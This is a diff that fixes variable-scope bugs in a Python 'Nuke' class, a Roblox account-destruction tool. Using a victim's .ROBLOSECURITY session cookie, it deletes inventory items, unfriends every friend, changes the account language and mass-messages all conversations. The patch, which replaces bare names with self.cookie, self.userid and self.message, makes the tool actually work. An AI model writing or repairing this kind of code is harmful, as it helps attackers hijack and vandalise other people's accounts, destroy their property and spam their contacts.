@@ -75,7 +75,7 @@ class Nuke:
       print("] " , end="")
       cprint(f"Sent message to {conversation['id']}", "magenta")
   def removeItems(self):
-    items = requests.get(f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={userid}",cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=self.headers).json()["Data"]["Items"]
+    items = requests.get(f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={self.userid}",cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=self.headers).json()["Data"]["Items"]
     for item in items:
       time.sleep(4)
       id = item["Item"]["AssetId"]
@@ -102,7 +102,7 @@ class Nuke:
     cprint(" NUKER ", "magenta", end="")
     print("] " , end="")
     cprint("Unfriending friends....", "magenta")
-    friends = requests.get(f"https://friends.roblox.com/v1/users/{userid}/friends", cookies={'.ROBLOSECURITY': str(self.cookie)}).json()['data']
+    friends = requests.get(f"https://friends.roblox.com/v1/users/{self.userid}/friends", cookies={'.ROBLOSECURITY': str(self.cookie)}).json()['data']
     friendIds = [friend['id'] for friend in friends]
     for i in friendIds:
       time.sleep(0.1)
@@ -131,15 +131,15 @@ class Nuke:
     os.system("")
     check = self.check()
     if check.status_code ==200:
-      self.headers={'X-CSRF-TOKEN': getXsrf(cookie)}
-      userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
+      self.headers={'X-CSRF-TOKEN': getXsrf(self.cookie)}
+      userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":self.cookie}).json() #get user data
       self.userid = userdata['id'] #user id
       clear()
       threading.Thread(target=self.flash).start()
       threading.Thread(target=self.unfriend).start()
       threading.Thread(target=self.changeLanguage).start()
       threading.Thread(target=self.removeItems).start()
-      threading.Thread(target=self.messageAll, args=(message,)).start()
+      threading.Thread(target=self.messageAll, args=(self.message,)).start()
     else:
       print("[", end="")
       cprint(" ERROR ", "red", end="")
